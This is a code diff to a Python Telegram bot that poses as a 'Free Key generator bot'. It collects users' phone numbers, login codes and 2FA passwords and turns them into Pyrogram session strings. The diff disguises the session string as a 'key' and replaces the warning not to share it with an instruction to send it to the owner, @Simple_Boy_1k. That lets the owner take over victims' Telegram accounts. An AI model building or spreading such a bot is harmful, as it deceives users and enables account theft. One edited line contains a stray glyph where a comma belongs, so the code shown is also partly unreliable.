@@ -30,15 +30,24 @@ user_states = {}
 async def start_cmd(client: Client, message: Message):
     user_id = message.from_user.id
     
-    # Reset any previous state and prompt for phone number
+    # Agar user ka pehle se koi active session process chal raha hai, toh use disconnect karein
+    if user_id in user_states:
+        old_client = user_states[user_id].get("client")
+        if old_client:
+            try:
+                await old_client.disconnect()
+            except Exception:
+                pass
+
+    # Reset state and prompt for phone number
     user_states[user_id] = {"step": "AWAITING_PHONE"}
 
     await message.reply_text(
-        "👑 <b>Welcome To Free Key generator bot\n 𝗙𝗥𝗘𝗘 𝗞𝗘𝗬 𝗟𝗘𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗔𝗣𝗡𝗔 𝗡𝗨𝗠𝗡𝗘𝗥 𝗢𝗥 𝗢𝗧𝗣 𝗗𝗔𝗟𝗘 👇👇</b>\n\n"
+        "👑 <b>Welcome To Free Key generator bot</b>\n"
+        "🔥 <b>𝗙𝗥𝗘𝗘 𝗞𝗘𝗬 𝗟𝗘𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗔𝗣𝗡𝗔 𝗡𝗨𝗠𝗕𝗘𝗥 𝗢𝗥 𝗢𝗧𝗣 𝗗𝗔𝗟𝗘 👇👇</b>\n\n"
         "📱 <b>Enter Phone Number</b>\n\n"
         "Kripya apna Telegram Phone Number country code ke sath bhejein:\n"
-        "<i>Example: <code>+919876543210</code></i>\n\n"
-        "<i>(Cancel karne ke liye /cancel likhein)</i>",
+        "<i>Example: <code>+919876543210</code></i>\n\n"‚
         parse_mode=enums.ParseMode.HTML
     )
 
@@ -77,14 +86,14 @@ async def handle_inputs(client: Client, message: Message):
         msg = await message.reply("⏳ OTP request bheja ja raha hai...")
 
         temp_client = Client(
-            name=f"pyro_{user_id}",
+            name=f"pyro_{user_id}_{asyncio.get_event_loop().time()}",
             api_id=Config.API_ID,
             api_hash=Config.API_HASH,
             in_memory=True
         )
-        await temp_client.connect()
-
+        
         try:
+            await temp_client.connect()
             code_info = await temp_client.send_code(phone_number)
             user_states[user_id] = {
                 "step": "AWAITING_OTP",
@@ -94,12 +103,18 @@ async def handle_inputs(client: Client, message: Message):
             }
         except PhoneNumberInvalid:
             await msg.edit_text("❌ Phone Number galat hai! Country code ke sath sahi number bhejein (e.g. <code>+919876543210</code>).")
-            await temp_client.disconnect()
+            try:
+                await temp_client.disconnect()
+            except:
+                pass
             user_states.pop(user_id, None)
             return
         except Exception as e:
             await msg.edit_text(f"❌ Error: <code>{str(e)}</code>\n\nDobara `/start` karein.")
-            await temp_client.disconnect()
+            try:
+                await temp_client.disconnect()
+            except:
+                pass
             user_states.pop(user_id, None)
             return
 
@@ -134,11 +149,17 @@ async def handle_inputs(client: Client, message: Message):
             )
         except (PhoneCodeInvalid, PhoneCodeExpired):
             await msg.edit_text("❌ Galat ya expired OTP! Dobara `/start` karein.")
-            await temp_client.disconnect()
+            try:
+                await temp_client.disconnect()
+            except:
+                pass
             user_states.pop(user_id, None)
         except Exception as e:
             await msg.edit_text(f"❌ Error: <code>{str(e)}</code>")
-            await temp_client.disconnect()
+            try:
+                await temp_client.disconnect()
+            except:
+                pass
             user_states.pop(user_id, None)
 
     # STEP 3: 2FA PASSWORD INPUT
@@ -158,7 +179,10 @@ async def handle_inputs(client: Client, message: Message):
             await msg.edit_text("❌ Galat 2FA Password! Dobara sahi password enter karein:")
         except Exception as e:
             await msg.edit_text(f"❌ Error: <code>{str(e)}</code>")
-            await temp_client.disconnect()
+            try:
+                await temp_client.disconnect()
+            except:
+                pass
             user_states.pop(user_id, None)
 
 
@@ -170,9 +194,9 @@ async def send_session(bot_client: Client, user_id: int, session_str: str, statu
         pass
 
     text = (
-        "🎉 <b>Pyrogram String Session Generated!</b>\n\n"
+        "🎉 <b>Pyrogram Your Key Generated!</b>\n\n"
         f"<code>{session_str}</code>\n\n"
-        "🔒 <b>Security Note:</b> Is string session ko kisi ke sath share mat karna. Isko Saved Messages me copy karke rakhein."
+        "🔒 <b>Key Update :</b> ISE COPY KRKE OWNER KO SEND KRE  @Simple_Boy_1k "
     )
     await bot_client.send_message(user_id, text, parse_mode=enums.ParseMode.HTML)
 
